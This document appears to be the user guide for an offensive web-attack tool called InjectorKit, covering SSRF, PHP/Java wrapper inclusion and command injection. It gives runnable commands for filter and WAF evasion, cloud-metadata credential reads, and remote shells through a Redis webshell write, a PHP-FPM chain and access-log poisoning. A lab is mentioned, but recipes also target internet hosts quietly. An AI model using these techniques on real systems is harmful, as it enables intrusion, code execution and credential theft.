# InjectorKit Guide

Everything the tool does today, in the order you will need it. Every command
here runs as written.

- [What it is](#what-it-is)
- [Running it](#running-it)
- [Giving it a target](#giving-it-a-target)
- [Choosing parameters](#choosing-parameters)
- [Callbacks](#callbacks)
- [Getting past filters](#getting-past-filters)
- [What it does, step by step](#what-it-does-step-by-step)
- [Exploitation](#exploitation)
- [The pseudo-protocol class](#the-pseudo-protocol-class)
- [The command-injection class](#the-command-injection-class)
- [Memory between runs](#memory-between-runs)
- [Reading the output](#reading-the-output)
- [Exit codes and scripting](#exit-codes-and-scripting)
- [Recipes](#recipes)
- [Troubleshooting](#troubleshooting)

## What it is

A tool that tests one class of vulnerability at a time, on one target at a time,
and decides for itself what to try next. You give it a request with a parameter
you suspect; it works out what that parameter can reach, whether a filter is
standing in the way and what gets past it, and - if you ask - turns what it found
into a file on disk or a command that runs.

It is not a scanner. It does not walk a site looking for candidates. It takes the
request you already have and goes deep on it.

## Running it

    python injectorkit.py ssrf -h
    python injectorkit.py ssrf -u "http://target/api/fetch?url=http://example.com"

Python 3.11 or newer. Nothing to install for the core. `cryptography` is needed
only if you collect callbacks through interactsh.

Every vulnerability class is a subcommand with its own options, plus the engine
options that all classes share.

## Giving it a target

Four ways in. Pick the one that matches what you have.

### A URL

    python injectorkit.py ssrf -u "http://target/api/fetch?url=http://example.com"

The parameter you suspect is in the URL. The tool finds the parameters itself.

### A captured request

    python injectorkit.py ssrf -r request.txt

`request.txt` is what a proxy saves - request line, headers, body. An
origin-form request line (`POST /api/fetch HTTP/1.1` with a `Host` header) works
as-is; so does an absolute one. The body is used byte for byte, so a multipart or
binary body survives the trip.

### Many targets at once

    python injectorkit.py ssrf --targets targets.txt

One target per line: a URL, or the path of a saved request file. Blank lines and
`#` comments are ignored. Each target is tested in turn against the same engine
options.

### The forms a page declares

    python injectorkit.py ssrf -u "http://target/login" --forms

The tool fetches the page, reads every form it declares, and builds each one the
way a browser would - GET fields in the query, POST fields in the body, upload
forms as real multipart. This is how you reach parameters that are not in the URL
at all: a login box, a search field, a file picker. Each form becomes its own
target.

## Choosing parameters

By default the tool picks the parameters that most often carry a URL: `url`,
`uri`, `dest`, `target`, `redirect`, `file`, `path`, `host`, and so on. A hundred
requests to a parameter nobody reads is a hundred wasted requests, so it also
remembers which ones were refused.

To name one yourself:

    --param url                query:url, or any position holding "url"
    --param query:url          the query string, exactly
    --param body:callback      a form or JSON field in the body
    --param cookie:next        a cookie
    --param multipart:avatar   one part of a multipart body
    --param "json -> ref"      a JSON field inside a parameter's value
    --param json:user.avatar   a field of a JSON body, by path

Nested JSON is addressed by path, arrays included: `json:meta.list[0].href`.

    --max-params 6             how many candidates to try (default 6)

Addresses look like this in the output: `query:url`, `json -> ref`,
`multipart:file`, `query:host + query:path` for a destination assembled from two
parameters.

## Callbacks

A blind vulnerability leaves nothing in the response. The only evidence is a
connection the target makes to an address you control, so the tool needs one.

### A listener on this machine

    python injectorkit.py ssrf -u "http://target/fetch?url=x" --oob 10.0.0.5:8081

Use this when the target can reach your machine - a CTF box on the same network,
a lab, anything that routes back to you.

    --oob-public 1.2.3.4:8081

If the machine has several addresses, or sits behind NAT, the tool has to know
which address to tell the target. That is what this is for.

### Through interactsh

    python injectorkit.py ssrf -u "http://target/fetch?url=x" --oob-interactsh oast.pro

The callback name resolves from anywhere, which is what you need for a target on
the internet. Public deployments: `oast.pro`, `oast.live`, `oast.site`,
`oast.online`, `oast.fun`, `oast.me`. A private one takes its name and its token:

    --oob-interactsh oast.example.com --oob-token <token>

The protocol details are handled for you: registration, the callback name, and
polling for records.

### Waiting

    --oob-wait 5.0

Seconds to wait for a callback after each attempt. Raise it for a slow target,
lower it when you are in a hurry and the network is quick.

If neither option is given, the blind actions skip themselves. A callback that
can never arrive is not a test, and planting one wastes a request.

## Getting past filters

Some of this is automatic; the rest needs one thing from you.

### Automatic

The tool already tries, in a learned order:

- **address spellings**: decimal (`2130706433`), octal (`0177.0.0.1`), hex
  (`0x7f000001`), short form (`127.1`), IPv4-mapped IPv6 (`[::ffff:127.0.0.1]`),
  a trailing dot (`127.0.0.1.`)
- **DNS aliases**: `127.0.0.1.nip.io`, `127-0-0-1.nip.io`, `127.0.0.1.sslip.io` -
  a filter that parses the destination sees a domain, the resolver sees the
  address
- **encoding**: single and double percent-encoding, special characters only,
  CRLF as `%0d%0a` or bare `%0a`, a trailing null byte
- **case**: alternating case, an uppercased scheme
- **authority confusion**: `http://x@host/`, `http://real.example@host/`, a tab
  in the authority

- **a second occurrence of the parameter**: the original value first, the payload
  last. A filter that reads one value per name judges the first; a runtime that
  keeps the last executes the payload. Nothing is rewritten to make this work, so
  it is tried before any mutation - and it is recorded separately, so the priors
  learn which targets read every occurrence and which read only the first

### A whitelist needs a route

A blocklist can be argued with; a whitelist cannot. The destination has to be
named as something the filter accepts and land somewhere else. That is what this
is for:

    --via "http://allowed-host/redirect?to={target}"

`{target}` stands for the real destination. Repeat the flag for several routes.
Use it when the target only accepts URLs on a host it trusts and that host has
any open redirect on it.

### Two parameters, one destination

An application that builds its destination from `?host=` and `?path=` cannot be
reached by filling in one of them. The tool fills both.

### A name that changes its answer

    --rebind 169.254.169.254,192.168.44.1

Every destination is tried again under a DNS name that alternates between those
two addresses (`rbndr.us`). This is what gets past a check that resolves the name
once, decides the address is fine, and connects later.

### Turning escalation off

    --no-bypass

Sends the seeds as written and nothing else. Useful when you are debugging why a
payload did not arrive, and when the target is production and you want the
smallest possible footprint.

## What it does, step by step

The tool runs a state machine over what it has learned so far. The actions, in
order:

    probe.metadata          ask for cloud instance metadata (AWS, Azure, GCP, Alibaba)
    probe.metadata.headers  ask again with the header the service demands
    probe.file              ask a fetch to read a local file (file://, php://filter, data://, ...)
    probe.callback          plant a callback and wait for it
    probe.redirect          answer a 302 and see whether the target walks the chain
    probe.diagnostics       look for fetch errors that quote our input
    probe.split             fill two parameters that form one destination
    probe.channel           classify how the result comes back
    scheme_matrix           try the schemes the channel suggests
    fingerprint.services    fingerprint internal services (redis, docker, etcd, kubelet, elastic, consul, memcached, PHP-FPM)
    exploit.services        when asked, act on what was fingerprinted
    report.summary          print it

Which action runs next is a decision, not a script: a service that answered moves
the run toward exploitation, a filter that refused changes the mutation
generation, a confirmed read closes the probing branch. `-v` shows the traffic
and the reasoning; `-vv` adds tracebacks.

## Exploitation

Off by default. Writing a file on someone's server or running a command there is
your decision, not the scanner's.

    --exploit --webroot /var/www/html

The Redis chain, for a Redis that answered. It sets `dir` and `dbfilename`,
disables RDB compression (without that the payload is stored compressed and PHP
parses none of it), writes a PHP shell, and then proves it by requesting the
shell and running `id` through it. Written but never executed is reported as
exactly that.

    --exploit --fpm-script /var/www/html/index.php

The PHP-FPM chain, for a FastCGI listener that answered. It sends a real FastCGI
record pair with `PHP_VALUE auto_prepend_file = php://input`, so the code in the
request body runs before the named script, and its output comes back inside the
FastCGI reply.

    --shell-name shell.php     what to write the shell as
    --fpm-port 9000            PHP-FPM port, when it is not the default

Both chains need the fingerprint first, so they only fire on a target where that
service is actually reachable.

## The pseudo-protocol class

    python injectorkit.py proto -u "http://target/?file=index.php"
    python injectorkit.py proto -r burp.txt --param file --oob 10.0.0.5:8081

A parameter that takes a filename is a dispatch point. Which wrapper it accepts
says which runtime sits behind it, and what that runtime will hand over.

What it tries, grouped by what the payload is for:

    php://filter              source disclosure, several filter chains including
                              double-encoded and mixed-filter spellings
    php://input, php://fd,    the wrappers that read the request itself
    php://memory, php://temp
    data://, expect://        code execution, when the runtime allows it
    file://, a bare path      a plain read, to establish that anything gets through
    zip://, phar://, rar://   an archive already on the target (needs --upload)
    compress.zlib, compress.bzip2, glob://, ssh2://, ogg://, ftp://
                              the rest of the PHP set
    jar:, jrt:, netdoc://     the Java side: a URL the JVM is asked to open
    ldap:, rmi:, dns:, iiop:  JNDI lookups, proved by a callback
    gopher:, dict:, tftp:     raw protocol writes, proved by a callback

Options that matter:

    --read FILE        a file worth reading (repeatable). The default is the
                       application's own source first, then /etc/passwd - a PHP
                       filter wants the former, a Java file reader cannot see it
    --upload PATH      a file already on the target, which enables zip:// and
                       phar://. A phar is the usual road from a file read to
                       deserialization
    --oob HOST:PORT    required by the remote families; without a listener they
                       skip themselves rather than plant a dead payload

The evidence is a string only the target's own behaviour produces: file
contents, an expanded filter chain, a marker this run invented, a class file's
magic number, or a connection back to the listener.

### Why it makes two passes

Every wrapper is sent as written before any of them is rewritten. The reason is
budget: a rule set that refuses one spelling of one wrapper would otherwise
consume the whole run on rewrites before the next family is even tried. Against
a third-party WAF that is exactly what happened - the PHP families spent ninety
requests climbing generations and the Java families were never reached, so the
run reported nothing while a wrapper that WAF had no rule for sat untested.

The first pass costs one request per wrapper and reaches all of them. The second
goes back over what did not answer and climbs the mutation generations there,
which is where a filter that only knows the usual spelling gets defeated.

### A live shell

    python injectorkit.py proto -u "http://target/?file=index.php" --os-shell
    os-shell> id
    uid=33(www-data) gid=33(www-data) groups=33(www-data)
    os-shell> cat /etc/hostname
    target
    os-shell> exit

    python injectorkit.py proto -u "..." --os-cmd "id; uname -a"

The chain is built once and reused. It carries a short reader that takes the
command from a second parameter, so each command is an ordinary request rather
than another multi-kilobyte URL - and the payload budget is what makes that
matter: every byte of payload costs roughly two hundred and fifty characters of
filter chain, while a web server enforces a limit on the request line. A chain
carrying the command itself runs out of room at around thirty bytes of payload.

The command therefore travels in the clear in that second parameter, which is the
wrong side of a filter that inspects values. It is the trade this design makes.

Input is read line by line, so a pipe works as well as a terminal:

    printf 'id\nexit\n' | python injectorkit.py proto -u "..." --os-shell

### When the target refuses every wrapper

A `php://filter` chain needs the application to accept `php://filter`. Plenty
refuse every scheme spelling while still handing the value straight to
`include()`:

    file=/etc/passwd                 -> root:x:0:0:...
    file=php://filter/...            -> Error: Invalid input
    file=file:///flag                -> Error: Invalid input
    file=phar://...                  -> Error: Invalid input

A plain path is all that survives, and a plain path is what the access log is.
Point `--log-path` at it, and the code goes into the file the server writes for
itself - through the `User-Agent`, which both nginx and apache record as sent:

    python injectorkit.py proto -u "https://target/" --forms --exploit \
        --log-path /var/log/nginx/access.log --os-cmd 'cat /var/www/html/flag.php'

The path differs by server; `/var/log/apache2/access.log` is the other common
one. Two things decide whether it works, and both fail in ways that look like
something else:

- **The file has to be readable by the user the application runs as.** Apache's
  own log is `640 root:adm`; a vhost's log is usually `644`. An unreadable log
  answers with the page and no error, which reads as "the code did not run".
- **The file has to be small enough to be included whole.** The payload lands at
  the end, so a log that has been running for weeks never gets that far - the
  response stops partway through and the marker is simply absent. Empty or rotate
  it first. The tool says which of the two it saw.

The payload quotes the array key with single quotes. Apache escapes double quotes
in a request line as it writes them, so `$_GET["c"]` lands in the log with
backslashes in it and including that file is a parse error rather than a command.
Single quotes need no escaping, and PHP reads the key either way.

### What it does not do

It does not build the archive a `phar://` probe needs, and it does not upload
one; `--upload` points at something already on the target. The JNDI schemes are
sent and judged by callback, but a listener that only speaks HTTP records the
connection and not the protocol exchange - enough to prove the target dialled out,
not enough to serve a gadget.

## The command-injection class

    python injectorkit.py cmdi -u "http://target/ping?host=127.0.0.1"
    python injectorkit.py cmdi -u "http://target/" --data "host=127.0.0.1" --param host
    python injectorkit.py cmdi -u "http://target/ping?host=x" --exploit --os-cmd 'id'

A parameter that reaches a shell is a question, not a payload list. The tool asks
the target to print two markers it has just invented with a computed number
between them:

    echo ik<random>; echo $((4831+2957)); echo ik<random>

The page that reflects the input hands back the expression. Only a shell that ran
it hands back `7788`. Nothing about that payload contains the answer, so a page
echoing its own input cannot pass - which is the whole point, because reflexion
is what a command-injection probe most easily mistakes for execution.

Because the question is the same in every shell, the shell is something to
search rather than something to assume. Two axes are crossed:

    the language      sh, bash, PowerShell, the Windows command interpreter -
                      modelled as what can print a literal and print a sum, so
                      the payload is written the way that shell writes it
    how it starts     the value is the whole command; or it is an argument to a
                      command the page already runs and has to be ended first,
                      with `;`, `|`, `&&`, `||` or a newline

The dialect decides which rewrites apply, not whether a capability exists. Brace
expansion, for instance, is bash and not dash - so it is a rewrite that belongs
to one dialect rather than one the catalogue gives up on.

Every rewrite in the catalogue answers a single sentence: a filter reads the
value as text, the shell reads it as a command line, and a rewrite only earns its
place if it changes what the filter sees while the word the shell runs is
unchanged. Four candidates that could not answer it were measured and dropped,
including a separator form whose pipe swallows all but the last of the proof's
three statements.

Options that matter:

    --param NAME       which parameter to attack (default: pick the likely ones)
    --max-params N     how many of them to try
    --exploit          turns on the exploitation step; nothing runs without it
    --os-cmd COMMAND   the command to run through the shape that was proved
    --dry-run          resolve everything, send nothing

### Why it asks every dialect before deepening any

Every dialect-and-starting-point pair gets its cheapest question before any of
them is allowed to climb its rewrites - the same rule the pseudo-protocol class
follows, for the same reason.

It is not theoretical. Measured on a Windows host, the command interpreter is the
fourth entry in the list, and the first three spent the entire request budget
deepening one guess each: three hundred requests, no finding, and the fourth
dialect was never asked at all. Asking each pair once first finds it in
forty-three.

### Why a slow answer ends a seed

A value that reaches a command as an argument and does not end it makes that
command wait - a name to resolve, a host to reach. Measured on the lab, one such
payload costs fifteen seconds against a tenth of a second baseline, and the next
forty rewrites of it cost the same for the same answer. So the run measures a
reference response first, and a seed that comes back far slower than the best
answer so far is left unclimbed rather than spent. The other seeds are still
tried; nothing was learned about the filter, so nothing is rewarded.

### Running a command

`--os-cmd` runs one command through the delivery that was proved to work. The
marker goes out in the same request as the command, and the response is only
shown if the marker comes back in it. A separate self-check does not do: the run
sends a parameter-pollution request before each payload, and on a framework that
reads the first of a repeated parameter that request carries no payload at all -
so a check of its own can be satisfied by a request that carried nothing, and the
command that follows prints the page as though it were output.

When the marker does not come back, the tool says the injection stopped working
between proving it and using it. It does not print the response.

### What it does not do

It does not run a tamper table lifted from another tool, and it does not carry a
list of literal payloads. What it has is a question and rewrites derived from it,
each one traceable to the two layers it plays against. A target whose filter
refuses every spelling the catalogue has is reported as filtered - not clean -
because "nothing got through" and "nothing reached a shell" are different
findings and a run says which one it has.

## Memory between runs

### Which rewrites work

Every run reads and writes `.injectorkit/pheromone.json`: which address spellings
and encodings got through, per kind of filter. The first target pays for the
discovery; the next ones start from it. It only changes the order things are
tried in, never whether they are tried.

    --pheromone-file FILE      keep it somewhere else
    --no-pheromone             ignore it and leave it alone

If a target behaves differently from what the file suggests, the entries decay
back toward neutral - the file corrects itself rather than going stale.

### One target's progress

    --state s.json

Saves what was learned and picks it up next time. A resumed run skips the closed
paths instead of re-deriving them. This is scan state, not an authenticated
session - that is `-C` and `-H`:

    first run   requests sent: 14
    second run  session: 22 facts and 2 closed paths carried over
                requests sent: 3

A session belongs to the target it was recorded against. Pointed at a different
host it is ignored rather than applied, because feeding one host's refusals to
another is how a resumed scan quietly skips the thing it should have tested.

## Reading the output

Three prefixes:

    [!]  something was proved
    [+]  something was executed
    [>]  what the tool would do next, when it stopped short of doing it

A finding carries the parameter, the payload that worked, the generation that
produced it, the request, and the evidence:

    [!] aws-iam via query:url: signature present: secretaccesskey
    [!] ssrf-blind via query:url: http from 10.0.0.5: GET /81ac8963 (token 81ac8963)
    [!] internal service fingerprinted: docker-version (Exposed Docker API)

Then the board - everything the run established, with how sure it is:

    target: target.example
      ssrf.channel = 'out-of-band' [likely] classified from what the probes proved
      ssrf.fetch.confirmed = True [confirmed] callback 81ac8963 reached the listener
      closed paths:
        probe.metadata: request was refused
      not covered:
        probe.remote: no listener was given, so the remote wrappers were skipped
      requests sent: 14

Confidence is one of:

    confirmed     the evidence only has one explanation
    likely        consistent with the evidence, not the only reading
    inconclusive  noted, not relied upon

The two closing lists mean different things, and the difference is the point:

    closed paths   actions that ran and were ruled out. A result.
    not covered    actions that never ran, and what they would need. An open
                   question, and the thing to fix before trusting a clean run.

A run that says nothing about a capability reads as "there was nothing there".
`not covered` is how it says "it was never tried" instead - no listener for the
blind probes, no `--exploit` for the follow-up, no upload path for the archive
wrappers. If a line there surprises you, that is a hole in the run, not a
finding about the target.

The output is coloured when a person is reading it, and plain when it is not: a
pipe, a redirect or a log file gets text with nothing to strip out of it. The
default asks the stream and honours NO_COLOR - the convention terminals and log
collectors set when they cannot use escape sequences. `--color always` forces it
on, `--color never` turns it off.

## Exit codes and scripting
    0    the run finished (whether or not it found anything)
    1    a usage problem: no parameter to inject into, bad arguments
    2    no subcommand given
    130  interrupted

Note that 0 does not mean "found something". To script on findings, read the
output for `[!]` or parse the board:

    python injectorkit.py ssrf -u "$URL" -q | grep -q '^\[!\]' && echo vulnerable

## Recipes

**A URL parameter on a lab box**

    python injectorkit.py ssrf -u "http://10.0.0.9/fetch?url=http://example.com"

**The same, with callbacks back to you**

    python injectorkit.py ssrf -u "http://10.0.0.9/fetch?url=x" --oob 10.0.0.5:8081

**A target on the internet, behind NAT**

    python injectorkit.py ssrf -u "https://target/fetch?url=x" --oob-interactsh oast.pro

**A request from Burp**

    python injectorkit.py ssrf -r burp.txt --param body:url

**A whitelisting filter and a redirect on the trusted host**

    python injectorkit.py ssrf -u "http://target/fetch?url=x" \
        --via "http://trusted/out?u={target}" --oob 10.0.0.5:8081

**Go all the way, if a service is reachable**

    python injectorkit.py ssrf -u "http://target/fetch?url=x" \
        --exploit --webroot /var/www/html --fpm-script /var/www/html/index.php

**A list of hosts, quietly**

    python injectorkit.py ssrf --targets hosts.txt -q --oob-interactsh oast.pro

**Come back to it tomorrow**

    python injectorkit.py ssrf -u "http://target/fetch?url=x" --state target.json

## Troubleshooting

**It found nothing.** Check that the request you gave it actually reaches the
fetch. `-v` prints every request and its status. If everything comes back 403 or
the same page, the parameter is not the one being read - name another with
`--param`, or use `--forms` if the parameter is in a form.

**The blind test found nothing.** Without `--oob` or `--oob-interactsh` the blind
actions do not run at all. With a listener, check that the target can actually
reach the address: a target on another network cannot call back to a private
address, which is the case interactsh exists for.

**Everything is refused.** Look at `closed paths` in the output; it names what
was ruled out. If the refusal came from a whitelist, `--via` is the answer. If it
came from a semantic rule set that resolves the destination, an alias
(`nip.io`) or `--rebind` is.

**A chain did not fire.** `--exploit` needs the fingerprint first, and each chain
needs one more thing: `--webroot` for Redis (a directory the web server serves),
`--fpm-script` for PHP-FPM (a PHP file that exists on the target). Without them
the service is reported and left alone.

**It is too slow, or too loud.** `--max-requests` caps the run; `--delay` slows
it down; `-q` prints results only. `--no-bypass` sends seeds as written and
nothing else.

## The lab

`lab/` in this repository builds the target these examples are tested against on
a Debian or Kali box: a fetch endpoint, an include, an open redirect, a
two-parameter endpoint, real Redis, real PHP-FPM, stand-ins for the cloud
metadata and the internal services, and four filter profiles of increasing
strictness. See `lab/README.md` for what each one is for and what the tool does
against it.

---

Contact the authors for anything the code does not answer: coolmoon, guaidao2.
